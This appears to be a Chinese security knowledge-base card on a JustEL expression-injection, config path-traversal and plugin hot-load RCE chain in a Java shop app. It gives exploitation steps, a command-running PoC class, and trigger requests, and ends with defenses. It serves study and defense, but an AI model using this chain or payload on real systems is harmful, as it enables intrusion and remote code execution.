---
id: web-java-expression-justel-plugin-hotload-config-path-traversal
title: JustEL 表达式注入 + 配置路径穿越写 plugins.txt + HotInstallPlugin 热加载：addCart 参数到任意类实例化 RCE
type: scenario
domain: web
path: web/java/expression
technique: justel-expression-injection-plugin-hotload-chain
tags:
- java
- spring
- expression-injection
- justel
- rce
- file-upload
- path-traversal
- classloader
- plugin
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V227
  verified_at: '2026-11-07T06:43:23+08:00'
  notes: 已对照原文 safemail 代码与 img09-13 核对：addCart 用 String.format 把 operate/num 拼成 JustEL 表达式、PluginConfig.getPlugins 读 /data/plugins.txt 并 putExtendFunc、/admin/plugin/test 与 updatePlugins 触发注册、HotInstallPlugin.funcName=install 且 call 取 params[0] Base64 字节码经 ByteArrayClassLoader.define 后 newInstance、params[1] 只用于异常信息、FileUtil.saveImg 用 config path_<type>_img 拼接且 checkFileExt 只拒 .jsp、saveFilename 只查 ./，均与原文一致。修正：原文给出的 yv66vgAAADQAIQ... Base64 是 Exploit3.class（恶意 payload 类），不是 HotInstallPlugin，卡内已改正。另原文文字写 /admin/config/edit，实际修改配置的源码路由为 /admin/config/update（卡内按源码写 update）。未验证点：未搭环境复跑整链。与 EL/WAF、FastCMS 插件上传卡为 related，非重复。
url: /docs/web/java/expression/web-java-expression-justel-plugin-hotload-config-path-traversal/
draft: false
kb_aliases:
- JustEL 表达式注入
- HotInstallPlugin 热加载
- plugins.txt 任意写
- 配置路径穿越上传
- tmall safemail RCE
- JustEL runEval
---

## 一句话结论

Spring 商城应用的 `/addCart` 把用户可控的 `operate` 与 `num` 直接格式化进 JustEL 表达式并 `runEval`；当 `operate=install` 时命中 `HotInstallPlugin`，它把 `num` 当作 Base64 类字节、用自定义 ClassLoader `define` 后 `newInstance`，构造函数即执行任意代码。攻击者先用 `/admin/config/update` 把 `path_category_img` 改成 `../../../../../../../data`，再通过 `/admin/category/add` 上传内容为 `tmall.util.webplugins.HotInstallPlugin` 的 `plugins.txt`（保存路径由该配置拼接、只校验文件名不校验路径），访问 `/admin/plugin/test` 触发插件注册，最后请求 `/addCart?operate=install&num=<base64 class>` 完成 RCE。

## 原理

- **表达式注入入口**：`addCart` 中 `String expr = String.format("%s(\"%s\", \"%s\")", operate, num, cartItem.getNumber()); String num2 = (String) JustEL.runEval(expr, PluginConfig.getPluginContext());`。`operate` 被拼成函数名、`num` 被拼成第一个字符串参数，二者都来自请求；JustEL 会按表达式语法求值函数调用，而不是把 `operate` 当普通字符串。
- **插件注册表**：`PluginConfig.getPlugins()` 读取 `/data/plugins.txt` 的每一行，`Class.forName(line).getDeclaredConstructor().newInstance()`，再 `pluginsContext.putExtendFunc((ExtendFunctionExpr) instance)`；`HotInstallPlugin.funcName()` 返回 `"install"`，因此注册后 `install(...)` 可被 JustEL 调用。`/admin/plugin/test` 与 `/admin/plugin/updatePlugins` 都会触发 `getPlugins()`（原文代码中这两个路由未标 `@Auth`，是否受父类/拦截器保护需按目标确认）。
- **HotInstallPlugin 动态加载**：`call(Object... params)` 要求至少两个参数，取 `params[0]` 作为 Base64 字符串，`Base64.getDecoder().decode` 后交给内部 `ByteArrayClassLoader.define(bytes)`，再 `getDeclaredConstructor().newInstance()`。类名参数 `params[1]` 实际未参与加载，只用于异常信息；因此只需把恶意类的字节码 Base64 放进第一个参数。
- **写 plugins.txt 的路径**：`FileUtil.saveImg` 用 `config.get("path_" + type + "_img")` 作为相对目录，拼成 `System.getProperty("user.dir") + "/static/" + relativeFolderPath` 后 `transferTo`。`/admin/config/update` 可修改配置值；把 `path_category_img` 设为 `../../../../../../../data` 即可让 `static/../../.../data` 落到 `/data`。上传校验 `checkFileExt` 只拒绝文件名含 `.jsp`，`saveFilename.contains("./")` 只检查文件名，不检查配置目录，`plugins.txt` 可正常上传。
- **完整链**：改配置 → 上传 `plugins.txt` → 触发 `getPlugins` 注册 `install` → `/addCart?operate=install&num=<base64>` → JustEL 调用 `install("<base64>", "<num>")` → 类加载并实例化 → 构造函数执行命令。
- **根因**：把用户输入当表达式求值 + 配置驱动的上传目录未做规范化/根目录限制 + 插件清单可被任意文件写入 + 插件热加载直接实例化任意类名。

## 触发条件

- 应用使用 JustEL（`com.lfkdsk.justel`）并把请求参数拼进 `runEval` 表达式。
- 类路径中存在 `HotInstallPlugin`（或其他 `ExtendFunctionExpr` 插件），且 `/data/plugins.txt` 由应用读取并注册。
- `/admin/config/update` 可修改 `path_*_img` 配置（原文代码该路由未标 `@Auth`，但 `edit`/`tools` 标了 admin；实际权限以目标拦截器为准，原文以 admin 身份操作）。
- `/admin/category/add` 允许上传非 `.jsp` 文件，且保存目录来自配置、未做规范化。
- 应用对 `/data` 有写权限，`/admin/plugin/test` 可访问。

## 利用步骤

1. 登录后台（原文 admin/admin），获取有效会话。
2. 调用 `/admin/config/update`，把 `path_category_img`（或对应 type 的 `path_<type>_img`）的值改为 `../../../../../../../data`。
3. 上传 `plugins.txt`：`POST /admin/category/add`，`type=category`，文件名 `plugins.txt`，内容一行 `tmall.util.webplugins.HotInstallPlugin`；保存路径经配置穿越落到 `/data/plugins.txt`。
4. 访问 `/admin/plugin/test`（或 `/admin/plugin/updatePlugins`），`PluginConfig.getPlugins()` 读取该文件并把 `HotInstallPlugin` 注册为 `install` 函数。
5. 编写 Java 类，在构造函数中执行命令；`javac` 后 `base64 -w 0 Exploit3.class` 得到字节码 Base64。
6. 请求 `/addCart?operate=install&num=<base64>`；`String.format` 生成 `install("<base64>", "<cartNumber>")`，JustEL 调用插件，`HotInstallPlugin` 定义并实例化类，构造函数执行命令。
7. 命令结果写入 `/tmp/1`，用同应用 `/admin/category/getImg?path=/tmp/1` 读取（该接口只拦截路径含 `plugin`），或改用反弹 shell。

## PoC

`plugins.txt`：

```text
tmall.util.webplugins.HotInstallPlugin
```

恶意类：

```java
public class Exploit3 {
    public Exploit3() {
        try {
            String[] exp = {"/bin/sh", "-i", "whoami > /tmp/1"};
            Runtime.getRuntime().exec(exp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```bash
javac Exploit3.java
base64 -w 0 Exploit3.class
# 输出作为 num 参数
```

触发：

```http
GET /addCart?operate=install&num=<base64(Exploit3.class)> HTTP/1.1
Cookie: JSESSIONID=<session>
```

读取回显：

```http
GET /admin/category/getImg?path=/tmp/1 HTTP/1.1
```

原文截图还给出了完整的 `Exploit3.class` 字节码 Base64 示例（`yv66vgAAADQAIQ...`，即上面在构造函数中 `Runtime.getRuntime().exec` 的恶意类），可直接作为 `num` 参数。

## 变体与关联

- 表达式引擎变体：JustEL、SpEL、OGNL、MVEL、JSP EL；核心都是“函数名/参数可控 + 引擎执行”。
- 插件机制变体：`ExtendFunctionExpr` 注册表、`Class.forName` 动态加载、SPI/ServiceLoader、脚本引擎；只要能注入类名或字节码即可。
- 写文件变体：配置项控制上传目录、日志路径、模板路径、缓存路径；用 `../` 穿越到插件清单/计划任务/模板目录。
- 上传校验变体：只黑名单 `.jsp`、只检查文件名的 `./`、不校验最终规范路径；可用 `.txt`/`.json`/无扩展名。
- 关联卡片：[[web-java-expression-el-injection-waf-bypass-scanner-echo]]、[[web-java-expression-scriptengine-isjson-eval]]、[[web-generic-file-upload-dedecms-template-rename-php-waf-fileread]]、[[web-java-rce-command-queue-full-exception-allowlist-bypass]]（同文章另一条 RCE 链）。
- 边界：完整利用需要能写 `/data/plugins.txt` 并触发重载；若配置更新/插件路由在实际目标中受鉴权保护，需要先获得管理员会话或其他写文件原语。

## 检测与防御

- 禁止表达式求值用户输入：改用固定函数映射/白名单枚举，`operate` 只允许预定义值，绝不 `String.format` 拼表达式。
- 上传路径规范化：`Path.toRealPath()`/`getCanonicalPath()` 后校验必须位于允许的根目录内；上传目录不来自可编辑配置。
- 配置安全：限制可修改的配置键，`path_*` 类键只允许相对固定目录；配置写入接口加管理员鉴权与审计。
- 插件安全：插件清单文件签名/权限保护，插件目录不可由 Web 上传写入；动态加载只允许受信任类名/白名单。
- 监控：对 `plugins.txt` 的创建/修改、`/admin/plugin/test` 的异常调用、`addCart` 中 `operate` 非预期值告警。
